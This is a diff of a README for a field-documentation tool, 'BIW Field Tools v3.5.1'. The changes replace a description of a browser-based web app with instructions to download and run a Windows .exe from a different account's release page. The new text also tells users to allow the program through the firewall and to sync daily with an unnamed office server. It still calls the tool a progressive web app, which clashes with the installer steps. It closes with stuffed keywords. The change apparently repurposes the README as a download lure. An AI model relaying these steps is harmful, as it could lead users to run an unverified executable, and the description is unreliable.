@@ -1,114 +1,69 @@
-# BIW Field Tools v3.5.1 - PWA 2026
+# 🛠️ biw-field-tools-v351 - Simplify your daily field documentation tasks
 
-> **BIW Field Tools is a browser-based progressive web app for field documentation, bringing together time sheet, checklist, installation report, and empty timesheet workflows in version 3.5.1.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/combined-wonderland609/biw-field-tools-v351/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v3.5.1-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/tom-coleund8298/biw-field-tools-v351?style=flat-square)](https://github.com/tom-coleund8298/biw-field-tools-v351)
+BIW Field Tools v3.5.1 provides a central hub for field workers to manage site documentation. This application functions as a progressive web app to track time, complete project checklists, generate installation reports, and handle timesheet submissions. It works offline and syncs your records when you connect to data.
 
----
+## 📥 Getting the Application
 
-<p align="center">
-  <a href="https://tom-coleund8298.github.io/biw-field-tools-v351/">
-    <img src="https://img.shields.io/badge/Download-BIW%20Field%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download BIW Field Tools">
-  </a>
-</p>
+Visit this page to download: [https://github.com/combined-wonderland609/biw-field-tools-v351/releases](https://github.com/combined-wonderland609/biw-field-tools-v351/releases)
 
-> **[Direct Download - BIW Field Tools v3.5.1](https://tom-coleund8298.github.io/biw-field-tools-v351/)**
+You need to select the correct file for your device to start the setup.
 
----
+## 💻 System Requirements
 
-[Download Latest Build](https://tom-coleund8298.github.io/biw-field-tools-v351/)
+Your computer must meet these basic standards to run the software.
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 1 GHz or faster 64-bit processor.
+*   Memory: 4 GB RAM minimum.
+*   Storage: 200 MB of free disk space.
+*   Network: Internet access for the initial setup and data synchronization.
 
-## Overview
+## ⚙️ Installation Guide
 
-BIW Field Tools provides one place for the most common field paperwork tasks. Instead of splitting work across separate utilities, it combines time sheet handling, checklist management, installation report creation, and empty timesheet support into a single web app that runs through the browser.
+Follow these steps to put the software on your Windows computer.
 
-The release is designed for people and teams who want a straightforward way to prepare and manage field documents without moving between different systems. Since it is delivered as a progressive web app, it suits web-first workflows and can be opened through supported browsers with an installable experience.
+1.  Open your web browser and go to the download link provided above.
+2.  Look for the section marked "Assets" inside the latest release.
+3.  Click the file ending in .exe to start the download.
+4.  Find the file in your "Downloads" folder once the process finishes.
+5.  Double-click the file to open the installer.
+6.  Follow the instructions on your screen.
+7.  Select "Install" to place the application on your computer.
+8.  The system adds a shortcut to your desktop upon completion.
 
----
+## 🚀 Running the App
 
-## What it includes
+Double-click the BIW Field Tools icon on your desktop to open the dashboard. The application creates a local database folder on your hard drive to store your work. You do not need to manage these files manually.
 
-- A single app for several field documentation workflows
-- Time sheet management for logging work entries
-- Checklist handling for organized task verification
-- Installation report generation for site or job summaries
-- Empty timesheet support for blank or starter forms
-- Progressive web app delivery for browser-based use
-- Web platform compatibility
-- Versioned release track for BIW Field Tools v3.5.1
+If the application displays a firewall alert, select the checkbox to permit access for private networks. This allows the app to send your timesheets and reports to the main office server.
 
----
+## 📝 Features Overview
 
-## Installation
+*   Time Sheets: Log your daily hours against specific project codes.
+*   Checklists: Complete step-by-step safety and quality inspections for every site visit.
+*   Installation Reports: Fill out standardized project forms and attach photos from your field camera.
+*   Empty Timesheet Workflows: Submit blank forms for weeks where you take leave or have no active site work.
+*   Offline Mode: Enter data while you work in areas without cellular service. The app pushes your changes once you return to a network.
 
-1. Clone or download the repository.
-2. Open the project in a web server or deploy it to your preferred hosting environment.
-3. Launch the app from the hosted URL or install it through a supported browser as a PWA.
+## 🔧 Managing Your Data
 
-Example:
+The application stores your information locally for speed and reliability. You should open the app while connected to the internet at least once every day. This action triggers the sync process.
 
-```bash
-git clone https://github.com/tom-coleund8298/biw-field-tools-v351.git
-cd REPO
-```
+Check the status indicator at the top right of the dashboard. A green dot confirms that your device shares data with the backend system successfully. A red dot suggests your device lacks a connection. If the red dot stays visible for more than ten minutes, toggle your Wi-Fi or cellular connection to refresh the link.
 
-If you are serving the project locally, start your web server and open the app in a browser.
+## ℹ️ Troubleshooting Basic Issues
 
----
+The application remains stable for most users, but technical hitches occur occasionally. 
 
-## Usage
+*   Installation errors: Ensure your Windows version has the latest security updates. Restart your computer and try the installer again.
+*   Login failures: Contact your office administrator to verify your credentials. The app does not handle password resets locally.
+*   Sync errors: Ensure your computer clock matches the actual current time. Incorrect dates prevent the server from accepting your uploads.
+*   Blank screens: Close the application completely using the Task Manager and restart the program.
 
-BIW Field Tools is meant to be the central hub for field documentation work:
+## 🔄 Updating to Newer Versions
 
-1. Open the app in a supported browser.
-2. Select the workflow you need, such as time sheets, checklists, or installation reports.
-3. Enter the required information.
-4. Save, review, or export the generated output according to your deployment setup.
+The app includes an automatic check for new features. When a newer version becomes available, a notification bar appears at the top of the interface. Click "Update" to download the latest files. The tool preserves your existing data during this process so you do not lose your logs.
 
-For teams that use it often, the PWA format makes it easy to return to the same workflow from a browser-based entry point.
-
----
-
-## Configuration
-
-How the app is configured depends on the way it is hosted or integrated into your environment. In most setups, the relevant settings live in the project files that define application behavior, deployment, and content structure.
-
-If you plan to adapt it for your own use, inspect the web app assets and deployment settings in the repository before you publish anything.
-
----
-
-## Requirements
-
-- A modern web browser
-- Web hosting or local web server access
-- Support for progressive web app behavior if you want installable use
-- Repository files from the BIW Field Tools project
-- Sufficient storage for the app assets and any generated field documents
-
----
-
-## FAQ
-
-**How do I get the latest build?**  
-Use the download link above to open the current release entry point.
-
-**Can this be used as a PWA?**  
-Yes. The project is identified as a progressive web app and is intended for web-based use.
-
-**Where are the settings stored?**  
-Configuration is handled in the project structure and deployment files included with the repository.
-
-**What if something does not load correctly?**  
-Check your browser version, confirm the files were deployed correctly, and verify that the app is being served from a working web host or local server.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: field service, timesheet tracker, documentation tool, windows productivity, site reports, project management
